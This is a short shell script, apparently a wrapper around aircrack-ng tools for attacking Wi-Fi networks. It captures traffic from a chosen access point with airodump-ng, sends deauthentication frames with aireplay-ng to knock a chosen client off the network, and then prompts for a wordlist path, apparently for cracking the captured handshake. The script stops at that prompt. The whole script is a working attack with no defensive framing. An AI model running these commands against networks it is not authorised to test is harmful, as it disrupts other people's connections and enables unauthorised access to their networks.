 echo "enter your card for airodump"
 read ncard
 sudo airodump-ng $ncard
 echo name
 read name
 echo chanel
 read chanel
#90 
 echo mac 
 read mac
 sudo airodump-ng -w $name -c $chanel --bssid $mac $ncard
 read station 
 sudo aireplay-ng --deauth 10 -a $mac -c $station $ncard
 echo "wordlist path:"
 read word
